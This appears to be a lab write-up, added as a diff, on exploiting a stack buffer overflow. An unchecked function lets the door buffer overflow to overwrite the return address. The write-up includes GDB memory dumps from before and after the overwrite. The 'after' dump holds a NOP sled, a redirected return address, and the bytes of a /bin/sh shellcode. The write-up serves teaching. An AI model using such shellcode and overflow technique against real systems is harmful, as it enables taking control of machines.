@@ -1,0 +1,17 @@
+The vulnerability is the function get does not check length bounds. Thus we can overflow door to overwrite the return address. The buffer we inject consists of a bunch of nops, the return address and the shellcode. The return address is the address right after the 8-byte door array. To find the return address, we look at the address of &door. Then we look at the neighbor memory content to find the start of the shellcode. 
+
+GDB output:
+&door is at 0xbffffc38.
+Before the exploit, the content of neighbor memory are 
+0xbffffc38:	0xbffffcfc	0xb7e5f225	0xb7fed270	0x00000000
+0xbffffc48:	0xbffffc58	0x0804842a	0x08048440	0x00000000
+0xbffffc58:	0x00000000	0xb7e454d3	0x00000001	0xbffffcf4
+0xbffffc68:	0xbffffcfc	0xb7fdc858	0x00000000	0xbffffc1c
+0xbffffc78:	0xbffffcfc	0x00000000	0x0804821c	0xb7fd2000
+
+After the exploit, they become
+0xbffffc38:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc48:	0x90909090	0xbffffc58	0x90909090	0x90909090
+0xbffffc58:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
+0xbffffc68:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
+0xbffffc78:	0xffdce880	0x622fffff	0x732f6e69	0xb7fd0068
